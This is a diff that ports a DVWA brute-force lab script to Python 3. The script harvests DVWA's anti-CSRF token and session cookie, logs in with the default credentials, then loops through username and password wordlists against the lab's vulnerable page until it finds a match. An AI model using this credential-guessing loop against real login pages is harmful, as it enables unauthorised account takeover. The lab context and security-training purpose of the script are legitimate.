@@ -4,20 +4,20 @@
 #   Date: 2015-10-25
 # Author: g0tmi1k ~ https://blog.g0tmi1k.com/
 # Source: https://blog.g0tmi1k.com/dvwa/bruteforce-low/
+# Converted to Python 3 by thaituan.ctu
 
 import requests
 import sys
 import re
-from BeautifulSoup import BeautifulSoup
-
+from bs4 import BeautifulSoup
 
 # Variables
-target = 'http://192.168.1.44/DVWA'
+target = 'http://localhost'
 sec_level = 'low'
 dvwa_user = 'admin'
 dvwa_pass = 'password'
-user_list = '/usr/share/seclists/Usernames/top_shortlist.txt'
-pass_list = '/usr/share/seclists/Passwords/rockyou.txt'
+user_list = 'unix_users.txt'
+pass_list = 'unix_users.txt'
 
 
 # Value to look for in response header (Whitelisting)
@@ -28,23 +28,23 @@ success = 'Welcome to the password protected area'
 def csrf_token():
     try:
         # Make the request to the URL
-        print "\n[i] URL: %s/login.php" % target
+        print("\n[i] URL: %s/login.php" % target)
         r = requests.get("{0}/login.php".format(target), allow_redirects=False)
 
     except:
         # Feedback for the user (there was an error) & Stop execution of our request
-        print "\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target)
+        print("\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
         sys.exit(-1)
 
     # Extract anti-CSRF token
     soup = BeautifulSoup(r.text)
     user_token = soup("input", {"name": "user_token"})[0]["value"]
-    print "[i] user_token: %s" % user_token
+    print("[i] user_token: %s" % user_token)
 
     # Extract session information
     session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
     session_id = session_id.group(1)
-    print "[i] session_id: %s" % session_id
+    print("[i] session_id: %s" % session_id)
 
     return session_id, user_token
 
@@ -67,31 +67,31 @@ def dvwa_login(session_id, user_token):
 
     try:
         # Make the request to the URL
-        print "\n[i] URL: %s/login.php" % target
-        print "[i] Data: %s" % data
-        print "[i] Cookie: %s" % cookie
+        print("\n[i] URL: %s/login.php" % target)
+        print("[i] Data: %s" % data)
+        print("[i] Cookie: %s" % cookie)
         r = requests.post("{0}/login.php".format(target), data=data, cookies=cookie, allow_redirects=False)
 
     except:
         # Feedback for the user (there was an error) & Stop execution of our request
-        print "\n\n[!] dvwa_login: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target)
+        print("\n\n[!] dvwa_login: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
         sys.exit(-1)
 
     # Wasn't it a redirect?
     if r.status_code != 301 and r.status_code != 302:
         # Feedback for the user (there was an error again) & Stop execution of our request
-        print "\n\n[!] dvwa_login: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code)
+        print("\n\n[!] dvwa_login: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
         sys.exit(-1)
 
     # Did we log in successfully?
     if r.headers["Location"] != 'index.php':
         # Feedback for the user (there was an error) & Stop execution of our request
-        print "\n\n[!] dvwa_login: Didn't login (Header: %s  user: %s  password: %s  user_token: %s  session_id: %s).\n[i] Quitting." % (
-          r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id)
+        print("\n\n[!] dvwa_login: Didn't login (Header: %s  user: %s  password: %s  user_token: %s  session_id: %s).\n[i] Quitting." % (
+          r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id))
         sys.exit(-1)
 
     # If we got to here, everything should be okay!
-    print "\n[i] Logged in! (%s/%s)\n" % (dvwa_user, dvwa_pass)
+    print("\n[i] Logged in! (%s/%s)\n" % (dvwa_user, dvwa_pass))
     return True
 
 
@@ -112,20 +112,20 @@ def url_request(username, password, session_id):
 
     try:
         # Make the request to the URL
-        #print "\n[i] URL: %s/vulnerabilities/brute/" % target
-        #print "[i] Data: %s" % data
-        #print "[i] Cookie: %s" % cookie
+        #print("\n[i] URL: %s/vulnerabilities/brute/" % target)
+        #print("[i] Data: %s" % data)
+        #print("[i] Cookie: %s" % cookie)
         r = requests.get("{0}/vulnerabilities/brute/".format(target), params=data, cookies=cookie, allow_redirects=False)
 
     except:
         # Feedback for the user (there was an error) & Stop execution of our request
-        print "\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/brute/).\n[i] Quitting." % (target)
+        print("\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/brute/).\n[i] Quitting." % (target))
         sys.exit(-1)
 
     # Was it a ok response?
     if r.status_code != 200:
         # Feedback for the user (there was an error again) & Stop execution of our request
-        print "\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code)
+        print("\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
         sys.exit(-1)
 
     # We have what we need
@@ -153,7 +153,7 @@ def brute_force(session_id):
             i += 1
 
             # Feedback for the user
-            print ("[i] Try %s: %s // %s" % (i, USER, PASS))
+            print("[i] Try %s: %s // %s" % (i, USER, PASS))
 
             # Make request
             attempt = url_request(USER, PASS, session_id)
@@ -161,9 +161,9 @@ def brute_force(session_id):
 
             # Check response
             if success in attempt:
-                print ("\n\n[i] Found!")
-                print "[i] Username: %s" % (USER)
-                print "[i] Password: %s" % (PASS)
+                print("\n\n[i] Found!")
+                print("[i] Username: %s" % (USER))
+                print("[i] Password: %s" % (PASS))
                 return True
     return False
 
